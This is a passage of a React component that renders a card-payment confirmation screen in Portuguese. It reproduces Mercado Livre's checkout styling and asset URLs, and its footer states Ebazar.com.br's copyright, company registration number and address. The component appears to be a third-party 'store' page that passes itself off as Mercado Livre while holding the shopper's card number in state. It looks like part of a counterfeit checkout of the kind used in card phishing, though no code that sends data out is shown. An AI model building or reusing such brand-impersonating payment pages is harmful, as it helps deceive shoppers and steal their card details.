                                    <h2 className="andes-typography andes-typography--type-title andes-typography--size-xs andes-typography--color-primary andes-typography--weight-semibold">Detalhes do pagamento</h2>
                                </div>
                            </span>
                            <div className="andes-card bf-ui-core-card bf-ui-core-card--margin--bottom-spacing12 andes-card--flat andes-card--padding-16">
                                <div className="andes-card__content bf-ui-core-card__content bf-ui-core-card__content--flex bf-ui-core-card__content--flex-direction--column bf-ui-core-card__content--flex-align--stretch bf-ui-core-card__content--flex-text_align--left bf-ui-core-card__content--flex-justify--between bf-ui-core-card__content--flex-height--wrap_content bf-ui-core-card__content--flex-width--match_parent bf-ui-core-card__content--flex-wrap--no-wrap">
                                    <div className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--row bf-ui-core-container--flex-align--top bf-ui-core-container--flex-text_align--left bf-ui-core-container--flex-justify--left bf-ui-core-container--flex-height--wrap_content bf-ui-core-container--flex-width--match_parent bf-ui-core-container--flex-wrap--no-wrap">
                                        <div className="andes-thumbnail-container">
                                            <div className="andes-thumbnail andes-thumbnail--circle andes-thumbnail--40 bf-ui-core-thumbnail">
                                                <img aria-hidden="true" alt="" src="https://http2.mlstatic.com/storage/buyingflow-core-assets-web/bf-assets/svg/bf_v6_master.svg" />
                                            </div>
                                        </div>
                                        <div className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--column bf-ui-core-container--flex-align--left bf-ui-core-container--flex-text_align--left bf-ui-core-container--flex-justify--left bf-ui-core-container--flex-height--wrap_content bf-ui-core-container--flex-width--match_parent bf-ui-core-container--flex-wrap--no-wrap bf-ui-core-container--margin--left-spacing16">
                                            <span className="bf-ui-core-label" role="presentation">
                                                <span className="bf-ui-core-rich-text__body bf-ui-core-rich-text__body--primary bf-ui-core-rich-text__body--semibold bf-ui-core-rich-text__body--bodys">
                                                    <span className="andes-typography andes-typography--type-body andes-typography--size-s andes-typography--color-primary andes-typography--weight-semibold">Cartão **** {cardData?.cardNumber ? cardData.cardNumber.replace(/\s+/g, '').slice(-4) : '****'}</span>
                                                </span>
                                            </span>
                                            <span className="bf-ui-core-label bf-ui-core-label--flex bf-ui-core-label--flex-direction--row bf-ui-core-label--flex-align--left bf-ui-core-label--flex-text_align--left bf-ui-core-label--flex-justify--left bf-ui-core-label--flex-height--wrap_content bf-ui-core-label--flex-width--match_parent bf-ui-core-label--flex-wrap--wrap bf-ui-core-label--margin--top-spacing4">
                                                <span className="bf-ui-core-rich-text__body bf-ui-core-rich-text__body--primary bf-ui-core-rich-text__body--regular bf-ui-core-rich-text__body--bodys">
                                                    <span className="andes-typography andes-typography--type-body andes-typography--size-s andes-typography--color-primary andes-typography--weight-regular">{installments?.installments || 1}x</span>
                                                </span>
                                                <span style={{ marginLeft: 4 }} className="bf-ui-core-rich-text__price bf-ui-core-rich-text__price--primary">
                                                    <span className="andes-money-amount andes-money-amount--cents-comma" style={{ fontSize: '14px' }}>
                                                        <span className="andes-money-amount__currency-symbol">R$</span>
                                                        <span className="andes-money-amount__fraction">{valFmt.integer}</span>
                                                        <span>,</span>
                                                        <span className="andes-money-amount__cents">{valFmt.cents}</span>
                                                    </span>
                                                </span>
                                                <span className="bf-ui-core-rich-text__link bf-ui-core-rich-text__link--margin--left-spacing4">
                                                    <a className="andes-typography andes-typography--type-body andes-typography--size-xs andes-typography--color-link andes-typography--weight-semibold">Alterar parcelas</a>
                                                </span>
                                            </span>
                                        </div>
                                    </div>
                                </div>
                                <div className="andes-card__footer bf-ui-core-card__footer bf-ui-core-card__footer--flex bf-ui-core-card__footer--flex-direction--column bf-ui-core-card__footer--flex-align--stretch bf-ui-core-card__footer--flex-text_align--left bf-ui-core-card__footer--flex-justify--between bf-ui-core-card__footer--flex-height--wrap_content bf-ui-core-card__footer--flex-width--match_parent bf-ui-core-card__footer--flex-wrap--no-wrap andes-card__footer--border">
                                    <span className="bf-ui-core-rich-text__link">
                                        <a className="andes-typography andes-typography--type-body andes-typography--size-xs andes-typography--color-link andes-typography--weight-regular">Alterar meio de pagamento</a>
                                    </span>
                                </div>
                            </div>
                        </div>

                        {/* RESUMO DA COMPRA */}
                        <div id="resumo_da_compra_container" className="andes-card bf-ui-core-card andes-card--secondary-undefined andes-card--flat andes-card--padding-24">
                            <div className="andes-card__header bf-ui-core-card__header andes-card__header--border">
                                <span className="bf-ui-core-rich-text__body bf-ui-core-rich-text__body--primary bf-ui-core-rich-text__body--semibold bf-ui-core-rich-text__body--bodym">
                                    <span className="andes-typography andes-typography--type-body andes-typography--size-m andes-typography--color-primary andes-typography--weight-semibold">Resumo da compra</span>
                                </span>
                            </div>
                            <div className="andes-card__content bf-ui-core-card__content">

                                <div className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--row bf-ui-core-container--flex-align--top bf-ui-core-container--flex-text_align--left bf-ui-core-container--flex-justify--between bf-ui-core-container--flex-height--wrap_content bf-ui-core-container--flex-width--match_parent bf-ui-core-container--flex-wrap--no-wrap bf-ui-core-container--margin--top-spacing4 bf-ui-core-container--margin--bottom-spacing4 bf-ui-core-container--margin--left-spacing4 bf-ui-core-container--margin--right-spacing4">
                                    <span className="bf-ui-core-label">
                                        <span className="bf-ui-core-rich-text__body bf-ui-core-rich-text__body--primary bf-ui-core-rich-text__body--regular bf-ui-core-rich-text__body--bodym">
                                            <span className="andes-typography andes-typography--type-body andes-typography--size-m andes-typography--color-primary andes-typography--weight-regular">Produto</span>
                                        </span>
                                    </span>
                                    <span className="bf-ui-core-label">
                                        <span className="bf-ui-core-rich-text__price bf-ui-core-rich-text__price--primary">
                                            <span className="andes-money-amount andes-money-amount--cents-superscript" style={{ fontSize: '16px' }}>
                                                <span className="andes-money-amount__currency-symbol">R$</span>
                                                <span className="andes-money-amount__fraction">{formatCurrencyParts(cartTotal).integer}</span>
                                                <span className="andes-visually-hidden">,</span>
                                                <span className="andes-money-amount__cents andes-money-amount__cents--superscript-16" style={{ fontSize: '10px', marginTop: '2px' }}>{formatCurrencyParts(cartTotal).cents}</span>
                                            </span>
                                        </span>
                                    </span>
                                </div>

                                <div className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--row bf-ui-core-container--flex-align--top bf-ui-core-container--flex-text_align--left bf-ui-core-container--flex-justify--between bf-ui-core-container--flex-height--wrap_content bf-ui-core-container--flex-width--match_parent bf-ui-core-container--flex-wrap--no-wrap bf-ui-core-container--margin--top-spacing8">
                                    <span className="bf-ui-core-label">
                                        <span className="bf-ui-core-rich-text__body bf-ui-core-rich-text__body--primary bf-ui-core-rich-text__body--regular bf-ui-core-rich-text__body--bodym">
                                            <span className="andes-typography andes-typography--type-body andes-typography--size-m andes-typography--color-primary andes-typography--weight-regular">Envio</span>
                                        </span>
                                    </span>
                                    <span className="bf-ui-core-label">
                                        <span className="bf-ui-core-rich-text__price bf-ui-core-rich-text__price--positive">
                                            {selectedShipping && !selectedShipping.isFree ? (
                                                <span className="andes-money-amount andes-money-amount--cents-superscript" style={{ fontSize: '16px' }}>
                                                    <span className="andes-money-amount__currency-symbol">{shippingFmt.symbol}</span>
                                                    <span className="andes-money-amount__fraction">{shippingFmt.integer}</span>
                                                    <span className="andes-visually-hidden">,</span>
                                                    <span className="andes-money-amount__cents andes-money-amount__cents--superscript-16" style={{ fontSize: '10px', marginTop: '2px' }}>{shippingFmt.cents}</span>
                                                </span>
                                            ) : (isFreeShipping || selectedShipping?.isFree) ? (
                                                <span className="andes-typography andes-typography--type-body andes-typography--size-m andes-typography--color-positive andes-typography--weight-regular">Grátis</span>
                                            ) : (
                                                <span className="andes-typography andes-typography--type-body andes-typography--size-m andes-typography--color-primary andes-typography--weight-regular">—</span>
                                            )}
                                        </span>
                                    </span>
                                </div>

                                <hr className="bf-ui-core-separator bf-ui-core-separator--flex bf-ui-core-separator--flex-direction--column bf-ui-core-separator--flex-align--top bf-ui-core-separator--flex-text_align--left bf-ui-core-separator--flex-justify--left bf-ui-core-separator--flex-height--wrap_content bf-ui-core-separator--flex-width--match_parent bf-ui-core-separator--flex-wrap--no-wrap bf-ui-core-separator--margin--top-spacing16 bf-ui-core-separator--margin--bottom-spacing16 bf-ui-core-separator--background-gray100 bf-ui-core-separator--height-spacing1" />

                                <div className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--row bf-ui-core-container--flex-align--top bf-ui-core-container--flex-text_align--left bf-ui-core-container--flex-justify--between bf-ui-core-container--flex-height--wrap_content bf-ui-core-container--flex-width--match_parent bf-ui-core-container--flex-wrap--no-wrap bf-ui-core-container--margin--top-spacing4">
                                    <span className="bf-ui-core-label">
                                        <div className="bf-ui-core-rich-text__title bf-ui-core-rich-text__title--titles">
                                            <span className="andes-typography andes-typography--type-title andes-typography--size-s andes-typography--color-primary andes-typography--weight-semibold">Você pagará</span>
                                        </div>
                                    </span>
                                    <span className="bf-ui-core-label">
                                        <div className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--row bf-ui-core-container--flex-align--baseline">
                                            <span className="bf-ui-core-rich-text__title bf-ui-core-rich-text__title--titles" style={{ marginRight: 8 }}>
                                                <span className="andes-typography andes-typography--type-title andes-typography--size-s andes-typography--color-primary andes-typography--weight-semibold">{installments?.installments || 1}x</span>
                                            </span>
                                            <span className="bf-ui-core-rich-text__price bf-ui-core-rich-text__price--primary">
                                                <span className="andes-money-amount andes-money-amount--cents-superscript andes-money-amount--weight-semibold" style={{ fontSize: '20px' }}>
                                                    <span className="andes-money-amount__currency-symbol">R$</span>
                                                    <span className="andes-money-amount__fraction">{valFmt.integer}</span>
                                                    <span className="andes-visually-hidden">,</span>
                                                    <span className="andes-money-amount__cents andes-money-amount__cents--superscript-20" style={{ fontSize: '10px', marginTop: '4px' }}>{valFmt.cents}</span>
                                                </span>
                                            </span>
                                        </div>
                                    </span>
                                </div>

                                <div className="bf-ui-core-container bf-ui-core-container--margin--top-spacing24 confirm-btn-wrap">
                                    <button
                                        ref={inlineBtnRef}
                                        type="button"
                                        onClick={handleConfirm}
                                        disabled={confirmState !== 'idle'}
                                        className={`andes-button bf-ui-core-button bf-ui-core-button__simple bf-ui-core-button__hierarchy--loud bf-ui-core-button__size--large andes-button--large andes-button--loud confirm-btn${confirmState === 'loading' ? ' confirm-btn--loading' : ''}${confirmState === 'rejected' ? ' confirm-btn--rejected' : ''}`}>
                                        <span className="andes-button__content">
                                            <span className="btn-text">Confirmar a compra</span>
                                        </span>
                                        <span className="btn-dots">
                                            <span /><span /><span />
                                        </span>
                                    </button>
                                </div>
                            </div>
                        </div>

                    </div>
                </div>
            </main>

            {/* MOBILE STICKY FOOTER — só aparece quando o botão inline sai da viewport */}
            <footer
                id="review_footer_container"
                className={`mobile-only-block bf-ui-core-footer bf-ui-core-footer--flex bf-ui-core-footer--flex-direction--column bf-ui-core-footer--flex-align--center bf-ui-core-footer--flex-text_align--left bf-ui-core-footer--flex-justify--center bf-ui-core-footer--flex-height--wrap_content bf-ui-core-footer--flex-width--match_parent bf-ui-core-footer--flex-wrap--no-wrap bf-ui-core-footer--padding--top-spacing16 bf-ui-core-footer--padding--bottom-spacing24 bf-ui-core-footer--padding--left-spacing20 bf-ui-core-footer--padding--right-spacing20${showStickyFooter ? ' footer-visible' : ''}`}
                style={{ position: 'fixed', bottom: 0, left: 0, right: 0, backgroundColor: '#fff', zIndex: 100, borderTop: '1px solid #e1e1e1' }}
                data-js="footer" data-id="review_footer_container" data-testid="review_footer_container">
                <div id="review_footer_total_container" className="bf-ui-core-container bf-ui-core-container--flex bf-ui-core-container--flex-direction--row bf-ui-core-container--flex-align--top bf-ui-core-container--flex-text_align--left bf-ui-core-container--flex-justify--between bf-ui-core-container--flex-height--wrap_content bf-ui-core-container--flex-width--match_parent bf-ui-core-container--flex-wrap--no-wrap bf-ui-core-container--margin--top-spacing4" aria-hidden="false" data-js="container" data-id="review_footer_total_container" data-testid="review_footer_total_container">
                    <span className="bf-ui-core-label" role="presentation" data-testid="review_footer_total_description" id="review_footer_total_description" aria-hidden="false">
                        <span className="bf-ui-core-rich-text__body bf-ui-core-rich-text__body--primary bf-ui-core-rich-text__body--semibold bf-ui-core-rich-text__body--bodyl" aria-hidden="false" data-testid="review_footer_total_description_rich_text-0" id="review_footer_total_description_rich_text-0" role="presentation">
                            <span className="andes-typography andes-typography--type-body andes-typography--size-l andes-typography--color-primary andes-typography--weight-semibold" role="presentation">Total</span>
                        </span>
                    </span>
                    <span className="bf-ui-core-label" role="presentation" data-testid="review_footer_total_price" id="review_footer_total_price" aria-hidden="false">
                        <span className="bf-ui-core-rich-text__price bf-ui-core-rich-text__price--primary" data-testid="review_footer_total_price_rich_text-0" id="review_footer_total_price_rich_text-0" aria-hidden="false" role="presentation">
                            <span className="andes-money-amount andes-money-amount--cents-superscript andes-money-amount--weight-semibold" style={{ fontSize: '18px' }} role="img" aria-label={`R$ ${valFmt.integer},${valFmt.cents}`} aria-roledescription="Valor">
                                <span className="andes-money-amount__currency-symbol" aria-hidden="true">R$</span>
                                <span className="andes-money-amount__fraction" aria-hidden="true">{valFmt.integer}</span>
                                <span className="andes-visually-hidden" aria-hidden="true">,</span>
                                <span className="andes-money-amount__cents andes-money-amount__cents--superscript-18" style={{ fontSize: '10px', marginTop: '3px' }} aria-hidden="true">{valFmt.cents}</span>
                            </span>
                        </span>
                    </span>
                </div>
                <div className="confirm-btn-wrap" style={{ marginTop: '16px' }}>
                    <button type="button" onClick={handleConfirm} disabled={confirmState !== 'idle'}
                        className={`andes-button bf-ui-core-button bf-ui-core-button__simple bf-ui-core-button__hierarchy--loud bf-ui-core-button__size--large andes-button--large andes-button--loud confirm-btn${confirmState === 'loading' ? ' confirm-btn--loading' : ''}${confirmState === 'rejected' ? ' confirm-btn--rejected' : ''}`}
                        id="review_footer_confirm_button" aria-label="Confirmar a compra" data-testid="review_footer_confirm_button">
                        <span className="andes-button__content">
                            <span className="btn-text">Confirmar a compra</span>
                        </span>
                        <span className="btn-spinner" />
                        <span className="btn-dots">
                            <span /><span /><span />
                        </span>
                    </button>
                </div>
            </footer>

            <footer role="contentinfo" className="nav-footer" style={{ marginTop: '32px', paddingBottom: '90px' }}>
                <div className="nav-footer-user-info nav-bounds">
                    <div className="nav-footer-info-wrapper">
                        <div className="nav-footer-primaryinfo">
                            <small className="nav-footer-copyright">Copyright © 1999-2026 Ebazar.com.br LTDA.</small>
                        </div>
                        <p className="nav-footer-secondaryinfo">CNPJ n.º 03.007.331/0001-41 / Av. das Nações Unidas, nº 3.003, Bonfim, Osasco/SP - CEP 06233-903 - empresa do grupo Mercado Livre.</p>
                    </div>
                </div>
            </footer>
        </div>
    );
};

export default StoreCheckoutCardConfirmation;
